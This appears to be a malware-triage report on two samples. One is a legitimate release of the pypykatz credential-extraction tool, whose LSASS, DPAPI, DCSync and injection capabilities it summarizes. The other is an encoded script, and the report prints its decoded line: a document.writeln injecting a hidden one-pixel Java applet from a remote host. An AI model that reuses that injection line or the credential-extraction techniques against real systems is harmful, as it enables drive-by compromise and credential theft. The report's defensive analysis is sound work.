samples.identity: Unmodified skelsec/pypykatz 0.6.13 source release; a dual-use Windows credential-recovery and administration tool.
samples.behavior: CLI-gated LSASS live/minidump parsing, SAM/SECURITY registry decoding, DPAPI and browser-store decryption, Kerberos ticket handling, SMB and DCSync operations, token impersonation, and remote DLL injection helpers. setup.py only reads its version and declares packaging, dependencies and console entry points; __main__.py dispatches operator commands. No hidden startup downloader, exfiltration destination, or trojanized member found.
samples.label_hypothesis: The Mimikatz implementation and credential extraction/token/injection capabilities are recognized as hack-tool capabilities, and the package explicitly notes that its code has been reused in a state-backed trojan. This archive is the original legitimate tool, not that trojan.
samples.dependency_review: Reviewed package manifests and compatible release distributions of unicrypto 0.0.12, minidump 0.0.24, minikerberos 0.4.9, aiowinreg 0.0.13, msldap 0.5.15, winacl 0.1.9, aiosmb 0.4.14, aesedb 0.1.8, and tqdm 4.67.1. Setup/build metadata contains no hidden executable install hooks; aiowinreg and aesedb wheels contain no .pth/sitecustomize hooks. These are possible compatible dependencies, not a reconstructed environment or lockfile.
samples.limitations: Static source analysis; cleave reports flow/parser limitations in several archive members. Source inspection and an exact upstream archive hash comparison supplement these gaps.

samples.decoded_script: document.writeln('<APPLET CODE="aa.class" codebase="http://s.arheo.com" ARCHIVE="aa.jar" WIDTH=1 HEIGHT=1></APPLET>');
samples.behavior: JScript.Encode decodes a document.writeln call that injects a remote one-pixel Java applet. Applet codebase and ARCHIVE resolve to http://s.arheo.com/aa.jar. Both unload attributes call Open(), which is not defined in the recovered script; no working unload-based persistence is inferred.

reference_fetch.interpretation: Current response is HTML parking-page redirection, not a JAR. HTTPS fails with an unrecognized TLS server name. The historical applet payload could not be recovered; no registry modification, sandbox escape, or email propagation is attributed to this HTML alone.

samples.tools: cleave facts exposes ScriptDecode content. rizin misidentifies this textual carrier as Brainfuck and adds no useful execution evidence. binwalk is absent from PATH; tar/Python archive readers were used for archive inspection.

placement_review: Moved neutral XOR, output, hive, browser-store, password and packaging observations into their capability/property homes; retained exact consumers, expanded the SAM/LSA grouping, and removed unrelated identity claims. The new Script Encoder rules reuse the decoded corpus and require applet execution/concealment, not a filename or raw magic header. Exact moves are listed in pypykatz-fortnight-moves.json. New leaves are limited to the established Fortnight family identity; all neutral additions use existing leaves. Both placement passes (supported claim then nearest competing leaf) agree: neutral APIs cannot imply C2/evasion or unauthorized credential access. Names and descriptions state the actual evidence.
